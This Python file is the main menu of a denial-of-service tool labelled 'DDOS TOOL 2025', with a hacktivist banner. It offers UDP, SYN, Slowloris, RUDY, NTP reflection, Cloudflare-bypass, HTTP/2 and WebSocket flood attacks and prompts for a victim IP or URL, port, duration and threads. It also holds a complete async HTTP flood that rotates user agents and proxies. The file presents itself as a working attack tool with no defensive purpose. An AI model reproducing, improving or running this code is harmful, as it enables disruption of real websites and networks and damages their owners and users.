import threading
import sys
import asyncio
from core.udp_flood import udp_flood
from core.tcp_flood import syn_flood
from core.slowloris import slowloris
from core.rudyslayer import rudy_attack
from core.ntp_reflection import ntp_reflection_attack
from core.bypass_cloudflare import http_flood_bypass_cf
from core.layer7_http_flood import layer7_http_flood
from core.layer7_http2_flood import layer7_http2_flood
from core.layer7_websocket_flood import websocket_flood
from colorama import Fore, Style, init
import pyfiglet
import time
import random
import httpx

init(autoreset=True)

# --- BEGIN: Async HTTP Flood code (محدث ومدمج) ---

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
]

PROXIES = [
    # اتركها فارغة إذا لا تريد استخدام بروكسي
    # "http://127.0.0.1:8080",
    # "socks5://127.0.0.1:1080",
]

def get_proxies():
    return PROXIES

async def send_request(target_url, proxy_url=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://google.com",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    async with httpx.AsyncClient(timeout=10) as client:
        if proxy_url:
            response = await client.get(target_url, headers=headers, proxies=proxy_url)
        else:
            response = await client.get(target_url, headers=headers)
    return response.status_code

async def attack_worker(target_url, duration):
    timeout = time.time() + duration
    success = 0
    failure = 0
    proxies = get_proxies()

    while time.time() < timeout:
        proxy = None
        if proxies:
            proxy_str = random.choice(proxies)
            proxy = {"http://": proxy_str, "https://": proxy_str}
        try:
            status = await send_request(target_url, proxy_url=proxy)
            print(f"[HTTP Async] Request sent via {proxy if proxy else 'direct connection'} - Status: {status}")
            success += 1
        except Exception as e:
            print(f"[HTTP Async] Request error via {proxy if proxy else 'direct connection'}: {e}")
            failure += 1

    print(f"Attack finished: Success={success}, Failure={failure}")

async def http_flood(target_url, duration, concurrency):
    tasks = []
    for _ in range(concurrency):
        tasks.append(asyncio.create_task(attack_worker(target_url, duration)))
    await asyncio.gather(*tasks)

# --- END: Async HTTP Flood code ---


def print_header():
    ascii_banner = pyfiglet.figlet_format("Victory for Palestine")
    print(Fore.GREEN + ascii_banner)
    print(Fore.YELLOW + Style.BRIGHT + "Islamic Electronic Resistance".center(80))
    print(Style.RESET_ALL)

def get_target_info():
    target = input("🎯 Enter Target IP: ")
    port = int(input("🔌 Enter Port: "))
    duration = int(input("⏱️ Enter Duration (seconds): "))
    threads = int(input("🚀 Enter Number of Threads: "))
    return target, port, duration, threads

def udp_attack():
    target, port, duration, threads = get_target_info()
    print(f"🚀 Starting UDP Flood on {target}:{port} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=udp_flood, args=(target, port, duration))
        t.start()

def tcp_attack():
    target, port, duration, threads = get_target_info()
    print(f"🚀 Starting SYN Flood on {target}:{port} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=syn_flood, args=(target, port, duration))
        t.start()

def http_attack():
    target_url = input("🎯 Enter Target URL (e.g. http://example.com): ")
    duration = int(input("⏱️ Enter Duration (seconds): "))
    concurrency = int(input("🚀 Enter Number of Threads (Concurrency): "))
    print(f"🚀 Starting HTTP Flood on {target_url} for {duration}s with {concurrency} concurrent tasks")

    # لتشغيل async من sync, نستخدم asyncio.run
    asyncio.run(http_flood(target_url, duration, concurrency))

def slowloris_attack():
    target, port, duration, threads = get_target_info()
    print(f"🚀 Starting Slowloris attack on {target}:{port} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=slowloris, args=(target, port, duration))
        t.start()

def rudy_attack_thread():
    target, port, duration, threads = get_target_info()
    print(f"🚀 Starting RUDY attack on {target}:{port} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=rudy_attack, args=(target, port, duration))
        t.start()

def ntp_attack():
    victim_ip = input("🎯 Enter Victim IP: ")
    ntp_server_ip = input("🎯 Enter NTP Server IP: ")
    duration = int(input("⏱️ Duration in seconds: "))
    threads = int(input("🚀 Number of threads: "))
    pps = int(input("⚡ Packets per second per thread: "))
    ntp_reflection_attack(victim_ip, ntp_server_ip, 123, duration, threads, pps)

def http_cf_attack():
    target_url = input("🎯 Enter Target URL (e.g. http://example.com): ")
    duration = int(input("⏱️ Enter Duration (seconds): "))
    threads = int(input("🚀 Enter Number of Threads: "))
    print(f"🚀 Starting HTTP Flood (Bypass CF) on {target_url} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=http_flood_bypass_cf, args=(target_url, duration))
        t.start()

def layer7_http1_attack():
    target_url = input("🎯 Enter Target URL: ")
    duration = int(input("⏱️ Duration in seconds: "))
    threads = int(input("🚀 Number of Threads: "))
    print(f"🚀 Starting Layer7 HTTP/1.1 Flood on {target_url} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=layer7_http_flood, args=(target_url, duration))
        t.start()

def layer7_http2_attack():
    target_url = input("🎯 Enter Target URL: ")
    duration = int(input("⏱️ Duration in seconds: "))
    threads = int(input("🚀 Number of Threads: "))
    print(f"🚀 Starting Layer7 HTTP/2 Flood on {target_url} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=layer7_http2_flood, args=(target_url, duration))
        t.start()

def websocket_attack():
    target_url = input("🎯 Enter WebSocket URL (e.g. ws://example.com/socket): ")
    duration = int(input("⏱️ Duration in seconds: "))
    threads = int(input("🚀 Number of Threads: "))
    print(f"🚀 Starting WebSocket Flood on {target_url} for {duration}s with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=websocket_flood, args=(target_url, duration))
        t.start()

def main_menu():
    while True:
        print_header()
        print("\n=== DDOS TOOL 2025 ===")
        print("Select Attack Type:")
        print("[1] UDP Flood")
        print("[2] SYN Flood (TCP)")
        print("[3] HTTP Flood")
        print("[4] Slowloris Attack")
        print("[5] RUDY Attack")
        print("[6] NTP Reflection Attack")
        print("[7] HTTP Flood (Bypass Cloudflare)")
        print("[8] Layer7 HTTP/1.1 Flood Attack")
        print("[9] Layer7 HTTP/2 Flood Attack")
        print("[10] Layer7 WebSocket Flood Attack")
        print("[0] Exit")

        choice = input("Choose option: ")

        if choice == "1":
            udp_attack()
        elif choice == "2":
            tcp_attack()
        elif choice == "3":
            http_attack()
        elif choice == "4":
            slowloris_attack()
        elif choice == "5":
            rudy_attack_thread()
        elif choice == "6":
            ntp_attack()
        elif choice == "7":
            http_cf_attack()
        elif choice == "8":
            layer7_http1_attack()
        elif choice == "9":
            layer7_http2_attack()
        elif choice == "10":
            websocket_attack()
        elif choice == "0":
            print("Exiting... Goodbye!")
            sys.exit()
        else:
            print("Invalid choice! Please select 0-10.")

if __name__ == "__main__":
    print("🚀 DDOS TOOL 2025 CLI STARTED")
    main_menu()
